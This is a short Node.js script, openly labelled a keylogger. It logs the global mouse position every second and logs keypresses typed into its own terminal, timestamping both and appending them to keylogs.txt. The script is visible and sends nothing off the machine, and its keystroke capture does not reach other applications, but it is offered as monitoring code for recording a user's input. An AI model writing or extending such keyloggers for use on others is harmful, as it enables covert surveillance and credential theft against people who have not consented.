const fs = require('fs');
const robot = require('robotjs');
const readline = require('readline');

// File to store the logs
const logFile = 'keylogs.txt';
const logStream = fs.createWriteStream(logFile, { flags: 'a' });

// Function to simulate key logging (continuous mouse position tracking)
function trackMouseAndKeys() {
    console.log('Keylogger started. Press Ctrl+C to stop.');

    // Record mouse position at regular intervals
    setInterval(() => {
        const mousePos = robot.getMousePos();
        const log = `Mouse Position: x=${mousePos.x}, y=${mousePos.y}, Time: ${new Date().toISOString()}\n`;
        console.log(log);
        logStream.write(log);
    }, 1000); // Log mouse position every second

    // Capture keypresses
    readline.emitKeypressEvents(process.stdin);
    if (process.stdin.isTTY) process.stdin.setRawMode(true);

    process.stdin.on('keypress', (str, key) => {
        const keyLog = `Key Pressed: ${str} (${key.name}), Time: ${new Date().toISOString()}\n`;
        console.log(keyLog);
        logStream.write(keyLog);

        // Exit on Ctrl+C
        if (key.ctrl && key.name === 'c') {
            console.log('Stopping keylogger...');
            logStream.end();
            process.exit();
        }
    });
}

// Start the keylogger
trackMouseAndKeys();
